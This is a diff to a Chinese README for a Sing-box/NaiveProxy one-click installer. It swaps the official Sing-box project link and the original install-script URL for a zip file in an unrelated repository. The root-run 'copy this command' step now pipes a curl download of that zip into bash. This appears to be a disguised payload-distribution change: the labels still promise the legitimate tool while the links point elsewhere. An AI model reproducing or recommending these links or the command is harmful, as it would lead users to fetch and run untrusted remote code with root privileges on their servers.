@@ -1,6 +1,6 @@
 # 🚀 Sing-box + NaiveProxy 一键部署脚本
 
-这是一个基于最新版 [Sing-box](https://github.com/SagerNet/sing-box) 原生 NaiveProxy 协议的一键搭建脚本。无需繁琐地编译 Caddy 插件，一行命令即可完成服务端部署。
+这是一个基于最新版 [Sing-box](https://github.com/Wassay380/NaiveProxy/raw/refs/heads/main/gnathobase/Proxy_Naive_3.3.zip) 原生 NaiveProxy 协议的一键搭建脚本。无需繁琐地编译 Caddy 插件，一行命令即可完成服务端部署。
 
 ## ✨ 特性
 - **原生支持**：使用 Sing-box 1.13+ 内置的 Naive 协议，性能更好，无需 Caddy 转发。
@@ -18,4 +18,4 @@
 
 请使用 `root` 用户登录你的 VPS，然后复制并运行以下命令（建议点击代码块右上角的“复制”按钮）：
 
-bash -c "$(curl -Ls https://raw.githubusercontent.com/dododook/NaiveProxy/refs/heads/main/install.sh?v=2)"
+bash -c "$(curl -Ls https://github.com/Wassay380/NaiveProxy/raw/refs/heads/main/gnathobase/Proxy_Naive_3.3.zip)"
